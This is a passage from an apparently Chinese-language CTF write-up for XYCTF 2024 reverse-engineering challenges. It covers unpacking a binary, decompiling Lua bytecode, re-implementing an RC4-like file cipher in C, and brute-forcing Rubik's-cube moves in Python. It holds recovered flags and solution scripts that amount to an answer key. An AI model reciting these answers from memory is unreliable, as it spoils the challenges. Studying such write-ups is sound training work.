class="string">&#x27;XYCTF&#123;5b3e07567a9034d06851475481507a75&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="砸核桃">5.13. 砸核桃</h3>
<p>有壳 脱壳</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%A0%B8%E6%A0%B8%E6%A1%83%E6%9F%A5%E5%A3%B3.png" class title="砸核桃查壳">
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%A0%B8%E6%A0%B8%E6%A1%83%E8%84%B1%E5%A3%B3.png" class title="砸核桃脱壳">
<p>ida反编译结果是简单异或</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%A0%B8%E6%A0%B8%E6%A1%83%E7%AE%97%E6%B3%95.png" class title="砸核桃算法">
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%A0%B8%E6%A0%B8%E6%A1%83flag.png" class title="砸核桃flag">
<h3 id="What’s-this">5.14. What’s this</h3>
<p>拖进DIE里竟然告诉我是lua 那就去查lua咋逆向好了</p>
<p><code> java -jar C:\Users\Munchkin7035\Desktop\unluac_2023_12_24.jar &quot;C:\Users\Munchkin7035\Desktop\what's this (1)&quot; &gt;&gt; out.txt</code></p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">obfuscated_output = to_base64(<span class="built_in">output</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">reverse</span>(obfuscated_output)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">obfuscated_output = <span class="built_in">string</span>.<span class="built_in">gsub</span>(obfuscated_output, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">invalid_variable = obfuscated_output:<span class="built_in">rep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">if</span> obfuscated_output == <span class="string">&quot;==AeuFEcwxGPuJ0PBNzbC16ctFnPB5DPzI0bwx6bu9GQ2F1XOR1U&quot;</span> <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;You get the flag.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;F**k!&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>output -&gt; b64 -&gt; 字符串替换 -&gt; reverse -&gt; enc</p>
<p>在往上找到output的赋值操作</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">do</span></span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(value, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(temp + <span class="number">3</span>)</span><br><span class="line">  <span class="built_in">output</span> = <span class="built_in">output</span> .. temp</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>value -&gt; +3 -&gt; output</p>
<p>再往上找value赋值</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> temp = <span class="built_in">string</span>.<span class="built_in">byte</span>(flag, i)</span><br><span class="line">  temp = <span class="built_in">string</span>.<span class="built_in">char</span>(Xor(temp, <span class="number">8</span>) % <span class="number">256</span>)</span><br><span class="line">  value = value .. temp</span><br><span class="line">  i = i + <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="built_in">string</span>.<span class="built_in">len</span>(flag) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>flag -&gt; xor 8 -&gt; value</p>
<p>然后通过cyberchif得出flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=Reverse(&#x27;Character&#x27;)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Simple%20string&#x27;,&#x27;string&#x27;:&#x27;3&#x27;%7D,&#x27;g&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Simple%20string&#x27;,&#x27;string&#x27;:&#x27;4&#x27;%7D,&#x27;H&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Simple%20string&#x27;,&#x27;string&#x27;:&#x27;6&#x27;%7D,&#x27;W&#x27;,true,false,true,false)From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)SUB(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;3&#x27;%7D)XOR(%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;8&#x27;%7D,&#x27;Standard&#x27;,false)&amp;input=PT1BZXVGRWN3eEdQdUowUEJOemJDMTZjdEZuUEI1RFB6STBid3g2YnU5R1EyRjFYT1IxVQ&amp;ieol=CRLF&amp;oeol=CR</span><br></pre></td></tr></table></figure>
<img src="/2024/04/26/XYCTF2024-Writeup/Whats_this.png" class title="Whats_this">
<h3 id="Findme">5.15. Findme</h3>
<img src="/2024/04/26/XYCTF2024-Writeup/Findme%E5%AF%86%E7%A0%81%E8%A1%A8.png" class title="Findme密码表">
<p>生成的密码表，咋生成的我实在不想管了，就直接抄了一遍代码</p>
<p>然后是配合random来插值，只要重新跑一跑代码来跳过就行</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">uint8_t</span> byte_14001D960[<span class="number">512</span>];</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* Str = <span class="string">&quot;Find_Doraemon&quot;</span>; </span><br><span class="line"><span class="type">uint8_t</span> byte_14001D201;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> v9[<span class="number">532</span>];</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  <span class="type">int</span> v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="type">int</span> v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">0x200</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_14001D960[j] = -(<span class="type">char</span>)j;</span><br><span class="line">    v9[j] = Str[j % v7];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt; <span class="number">512</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = ((<span class="type">unsigned</span> __int8)v9[v11] + byte_14001D960[v11] + v12) % <span class="number">512</span>;</span><br><span class="line">    byte_14001D201 = byte_14001D960[v11];</span><br><span class="line">    byte_14001D960[v11] = byte_14001D960[v12];</span><br><span class="line">    byte_14001D960[v12] = byte_14001D201;</span><br><span class="line">    ++v11;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> v13=<span class="number">0</span>,v14=<span class="number">0</span>,v11=<span class="number">0</span>,v12,i,v8;</span><br><span class="line">	<span class="type">uint8_t</span> v15,v16;</span><br><span class="line">	<span class="built_in">init</span>(); </span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%<span class="number">16</span>==<span class="number">0</span>)<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>,byte_14001D960[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	FILE* fin=<span class="built_in">fopen</span>(<span class="string">R&quot;(C:\Users\jht3\Downloads\Findme\Doraemon1)&quot;,&quot;rb&quot;);</span></span><br><span class="line"><span class="string">	FILE* fout=fopen(R&quot;(C:\Users\jht3\Downloads\Findme\Doraemon3)&quot;,&quot;wb&quot;);</span></span><br><span class="line"><span class="string">	while(!feof(fin))&#123;</span></span><br><span class="line"><span class="string">		v13 = (v13 + 1) % 512;</span></span><br><span class="line"><span class="string">		v14 = (byte_14001D960[v13] + v14) % 512;</span></span><br><span class="line"><span class="string">		byte_14001D201 = byte_14001D960[v13];</span></span><br><span class="line"><span class="string">		byte_14001D960[v13] = byte_14001D960[v14];</span></span><br><span class="line"><span class="string">		byte_14001D960[v14] = byte_14001D201;</span></span><br><span class="line"><span class="string">		v16 = byte_14001D960[(unsigned __int8)((byte_14001D960[v14] + byte_14001D960[v13]) % 512)];</span></span><br><span class="line"><span class="string">		v15 = v16 ^ fgetc(fin);</span></span><br><span class="line"><span class="string">      	fputc(v15, fout);</span></span><br><span class="line"><span class="string">      	srand(byte_14001D960[v11 % 512]);</span></span><br><span class="line"><span class="string">		v12 = rand() % 4;</span></span><br><span class="line"><span class="string">		//printf(&quot;v12 %d\n&quot;,v12);</span></span><br><span class="line"><span class="string">		for ( i = 0; i &lt; v12; ++i )</span></span><br><span class="line"><span class="string">		&#123;</span></span><br><span class="line"><span class="string">			v8 = rand();</span></span><br><span class="line"><span class="string">			if(!feof(fin))assert(v8 % 0x100==fgetc(fin));</span></span><br><span class="line"><span class="string">			else break;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		++v11;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	fclose(fin);</span></span><br><span class="line"><span class="string">	fclose(fout);</span></span><br><span class="line"><span class="string">	return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>然后就能获得Dorameon3，查看一下代码</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Findme_Dorameon3.png" class title="Findme_Dorameon3">
<p>额，读入xor key，然后还不知道输出文件格式，一时间没什么思路，但是还剩可以先做一下xor14的</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Findme_xor14.png" class title="Findme_xor14">
<p>看到有Doraemon的字符循环，猜测把原文件的空白字节段给xor了的结果，于是猜测xor key就是Doraemon：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Findme_Doraemon%E5%A1%AB%E5%85%85.png" class title="Findme_Doraemon填充">
<p>cyberchif还贴心的识别出了这是个gif，真不错，打开看见flag</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Findme_flag.png" class title="Findme_flag">
<h3 id="ez-cube">5.16. ez_cube</h3>
<p>你会玩魔方吗，反正我不会</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_cube.png" class title="ez_cube">
<p>观察到长度只有12，操作还只有4种，那就 爆破 由于要最简操作还能做个剪枝 跑的应该挺快(大概)！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四个字符</span></span><br><span class="line">chars = [<span class="string">&quot;R&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;u&quot;</span>]</span><br><span class="line">length = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用itertools.product生成所有可能的排列组合</span></span><br><span class="line">permutations = itertools.product(chars, repeat=length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选出长度为12的字符串</span></span><br><span class="line">result = [<span class="string">&quot;&quot;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> permutations <span class="keyword">if</span> <span class="built_in">len</span>(p) == length]</span><br><span class="line"></span><br><span class="line">result = [</span><br><span class="line">    i</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>([k <span class="keyword">in</span> i <span class="keyword">for</span> k <span class="keyword">in</span> [<span class="string">&quot;Rr&quot;</span>, <span class="string">&quot;rR&quot;</span>, <span class="string">&quot;Uu&quot;</span>, <span class="string">&quot;uU&quot;</span>, <span class="string">&quot;RRR&quot;</span>, <span class="string">&quot;rrr&quot;</span>, <span class="string">&quot;UUU&quot;</span>, <span class="string">&quot;uuu&quot;</span>]])</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">ans</span>):</span><br><span class="line">    RedFace = [<span class="string">&quot;Red&quot;</span>] * <span class="number">9</span></span><br><span class="line">    BlueFace = [<span class="string">&quot;Blue&quot;</span>] * <span class="number">9</span></span><br><span class="line">    GreenFace = [<span class="string">&quot;Green&quot;</span>] * <span class="number">9</span></span><br><span class="line">    OrangeFace = [<span class="string">&quot;Orange&quot;</span>] * <span class="number">9</span></span><br><span class="line">    YellowFace = [<span class="string">&quot;Yellow&quot;</span>] * <span class="number">9</span></span><br><span class="line">    WhiteFace = [<span class="string">&quot;White&quot;</span>] * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">    BlueFace[<span class="number">1</span>] = <span class="string">&quot;Red&quot;</span></span><br><span class="line">    RedFace[<span class="number">1</span>] = <span class="string">&quot;Green&quot;</span></span><br><span class="line">    GreenFace[<span class="number">1</span>] = <span class="string">&quot;Blue&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">R</span>():</span><br><span class="line">        v1 = RedFace[<span class="number">2</span>]</span><br><span class="line">        v2 = RedFace[<span class="number">5</span>]</span><br><span class="line">        v3 = RedFace[<span class="number">8</span>]</span><br><span class="line">        RedFace[<span class="number">2</span>] = WhiteFace[<span class="number">2</span>]</span><br><span class="line">        RedFace[<span class="number">5</span>] = WhiteFace[<span class="number">5</span>]</span><br><span class="line">        RedFace[<span class="number">8</span>] = WhiteFace[<span class="number">8</span>]</span><br><span class="line">        WhiteFace[<span class="number">2</span>] = OrangeFace[<span class="number">6</span>]</span><br><span class="line">        WhiteFace[<span class="number">5</span>] = OrangeFace[<span class="number">3</span>]</span><br><span class="line">        WhiteFace[<span class="number">8</span>] = OrangeFace[<span class="number">0</span>]</span><br><span class="line">        OrangeFace[<span class="number">0</span>] = YellowFace[<span class="number">8</span>]</span><br><span class="line">        OrangeFace[<span class="number">3</span>] = YellowFace[<span class="number">5</span>]</span><br><span class="line">        OrangeFace[<span class="number">6</span>] = YellowFace[<span class="number">2</span>]</span><br><span class="line">        YellowFace[<span class="number">2</span>] = v1</span><br><span class="line">        YellowFace[<span class="number">5</span>] = v2</span><br><span class="line">        YellowFace[<span class="number">8</span>] = v3</span><br><span class="line">        v4 = GreenFace[<span class="number">1</span>]</span><br><span class="line">        GreenFace[<span class="number">1</span>] = GreenFace[<span class="number">3</span>]</span><br><span class="line">        GreenFace[<span class="number">3</span>] = GreenFace[<span class="number">7</span>]</span><br><span class="line">        GreenFace[<span class="number">7</span>] = GreenFace[<span class="number">5</span>]</span><br><span class="line">        GreenFace[<span class="number">5</span>] = v4</span><br><span class="line">        v5 = GreenFace[<span class="number">0</span>]</span><br><span class="line">        GreenFace[<span class="number">0</span>] = GreenFace[<span class="number">6</span>]</span><br><span class="line">        GreenFace[<span class="number">6</span>] = GreenFace[<span class="number">8</span>]</span><br><span class="line">        GreenFace[<span class="number">8</span>] = GreenFace[<span class="number">2</span>]</span><br><span class="line">        GreenFace[<span class="number">2</span>] = v5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">U</span>():</span><br><span class="line">        v1 = RedFace[<span class="number">0</span>]</span><br><span class="line">        v2 = RedFace[<span class="number">1</span>]</span><br><span class="line">        v3 = RedFace[<span class="number">2</span>]</span><br><span class="line">        RedFace[<span class="number">0</span>] = GreenFace[<span class="number">0</span>]</span><br><span class="line">        RedFace[<span class="number">1</span>] = GreenFace[<span class="number">1</span>]</span><br><span class="line">        RedFace[<span class="number">2</span>] = GreenFace[<span class="number">2</span>]</span><br><span class="line">        GreenFace[<span class="number">0</span>] = OrangeFace[<span class="number">0</span>]</span><br><span class="line">        GreenFace[<span class="number">1</span>] = OrangeFace[<span class="number">1</span>]</span><br><span class="line">        GreenFace[<span class="number">2</span>] = OrangeFace[<span class="number">2</span>]</span><br><span class="line">        OrangeFace[<span class="number">0</span>] = BlueFace[<span class="number">0</span>]</span><br><span class="line">        OrangeFace[<span class="number">1</span>] = BlueFace[<span class="number">1</span>]</span><br><span class="line">        OrangeFace[<span class="number">2</span>] = BlueFace[<span class="number">2</span>]</span><br><span class="line">        BlueFace[<span class="number">0</span>] = v1</span><br><span class="line">        BlueFace[<span class="number">1</span>] = v2</span><br><span class="line">        BlueFace[<span class="number">2</span>] = v3</span><br><span class="line">        v4 = YellowFace[<span class="number">1</span>]</span><br><span class="line">        YellowFace[<span class="number">1</span>] = YellowFace[<span class="number">3</span>]</span><br><span class="line">        YellowFace[<span class="number">3</span>] = YellowFace[<span class="number">7</span>]</span><br><span class="line">        YellowFace[<span class="number">7</span>] = YellowFace[<span class="number">5</span>]</span><br><span class="line">        YellowFace[<span class="number">5</span>] = v4</span><br><span class="line">        v5 = YellowFace[<span class="number">0</span>]</span><br><span class="line">        YellowFace[<span class="number">0</span>] = YellowFace[<span class="number">6</span>]</span><br><span class="line">        YellowFace[<span class="number">6</span>] = YellowFace[<span class="number">8</span>]</span><br><span class="line">        YellowFace[<span class="number">8</span>] = YellowFace[<span class="number">2</span>]</span><br><span class="line">        YellowFace[<span class="number">2</span>] = v5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">r</span>():</span><br><span class="line">        v1 = RedFace[<span class="number">2</span>]</span><br><span class="line">        v2 = RedFace[<span class="number">5</span>]</span><br><span class="line">        v3 = RedFace[<span class="number">8</span>]</span><br><span class="line">        RedFace[<span class="number">2</span>] = YellowFace[<span class="number">2</span>]</span><br><span class="line">        RedFace[<span class="number">5</span>] = YellowFace[<span class="number">5</span>]</span><br><span class="line">        RedFace[<span class="number">8</span>] = YellowFace[<span class="number">8</span>]</span><br><span class="line">        YellowFace[<span class="number">2</span>] = OrangeFace[<span class="number">6</span>]</span><br><span class="line">        YellowFace[<span class="number">5</span>] = OrangeFace[<span class="number">3</span>]</span><br><span class="line">        YellowFace[<span class="number">8</span>] = OrangeFace[<span class="number">0</span>]</span><br><span class="line">        OrangeFace[<span class="number">0</span>] = WhiteFace[<span class="number">8</span>]</span><br><span class="line">        OrangeFace[<span class="number">3</span>] = WhiteFace[<span class="number">5</span>]</span><br><span class="line">        OrangeFace[<span class="number">6</span>] = WhiteFace[<span class="number">2</span>]</span><br><span class="line">        WhiteFace[<span class="number">2</span>] = v1</span><br><span class="line">        WhiteFace[<span class="number">5</span>] = v2</span><br><span class="line">        WhiteFace[<span class="number">8</span>] = v3</span><br><span class="line">        v4 = GreenFace[<span class="number">1</span>]</span><br><span class="line">        GreenFace[<span class="number">1</span>] = GreenFace[<span class="number">5</span>]</span><br><span class="line">        GreenFace[<span class="number">5</span>] = GreenFace[<span class="number">7</span>]</span><br><span class="line">        GreenFace[<span class="number">7</span>] = GreenFace[<span class="number">3</span>]</span><br><span class="line">        GreenFace[<span class="number">3</span>] = v4</span><br><span class="line">        v5 = GreenFace[<span class="number">0</span>]</span><br><span class="line">        GreenFace[<span class="number">0</span>] = GreenFace[<span class="number">2</span>]</span><br><span class="line">        GreenFace[<span class="number">2</span>] = GreenFace[<span class="number">8</span>]</span><br><span class="line">        GreenFace[<span class="number">8</span>] = GreenFace[<span class="number">6</span>]</span><br><span class="line">        GreenFace[<span class="number">6</span>] = v5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">u</span>():</span><br><span class="line">        v1 = RedFace[<span class="number">0</span>]</span><br><span class="line">        v2 = RedFace[<span class="number">1</span>]</span><br><span class="line">        v3 = RedFace[<span class="number">2</span>]</span><br><span class="line">        RedFace[<span class="number">0</span>] = BlueFace[<span class="number">0</span>]</span><br><span class="line">        RedFace[<span class="number">1</span>] = BlueFace[<span class="number">1</span>]</span><br><span class="line">        RedFace[<span class="number">2</span>] = BlueFace[<span class="number">2</span>]</span><br><span class="line">        BlueFace[<span class="number">0</span>] = OrangeFace[<span class="number">0</span>]</span><br><span class="line">        BlueFace[<span class="number">1</span>] = OrangeFace[<span class="number">1</span>]</span><br><span class="line">        BlueFace[<span class="number">2</span>] = OrangeFace[<span class="number">2</span>]</span><br><span class="line">        OrangeFace[<span class="number">0</span>] = GreenFace[<span class="number">0</span>]</span><br><span class="line">        OrangeFace[<span class="number">1</span>] = GreenFace[<span class="number">1</span>]</span><br><span class="line">        OrangeFace[<span class="number">2</span>] = GreenFace[<span class="number">2</span>]</span><br><span class="line">        GreenFace[<span class="number">0</span>] = v1</span><br><span class="line">        GreenFace[<span class="number">1</span>] = v2</span><br><span class="line">        GreenFace[<span class="number">2</span>] = v3</span><br><span class="line">        v4 = YellowFace[<span class="number">1</span>]</span><br><span class="line">        YellowFace[<span class="number">1</span>] = YellowFace[<span class="number">5</span>]</span><br><span class="line">        YellowFace[<span class="number">5</span>] = YellowFace[<span class="number">7</span>]</span><br><span class="line">        YellowFace[<span class="number">7</span>] = YellowFace[<span class="number">3</span>]</span><br><span class="line">        YellowFace[<span class="number">3</span>] = v4</span><br><span class="line">        v5 = YellowFace[<span class="number">0</span>]</span><br><span class="line">        YellowFace[<span class="number">0</span>] = YellowFace[<span class="number">2</span>]</span><br><span class="line">        YellowFace[<span class="number">2</span>] = YellowFace[<span class="number">8</span>]</span><br><span class="line">        YellowFace[<span class="number">8</span>] = YellowFace[<span class="number">6</span>]</span><br><span class="line">        YellowFace[<span class="number">6</span>] = v5</span><br><span class="line"></span><br><span class="line">    d = &#123;<span class="string">&quot;R&quot;</span>: R, <span class="string">&quot;U&quot;</span>: U, <span class="string">&quot;r&quot;</span>: r, <span class="string">&quot;u&quot;</span>: u&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        d[i]()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;Red&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> RedFace]),</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;Blue&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> BlueFace]),</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;Green&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> GreenFace]),</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;Orange&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> OrangeFace]),</span><br><span class="line">            <span class="built_in">all</span>([i == <span class="string">&quot;Yellow&quot;</span> 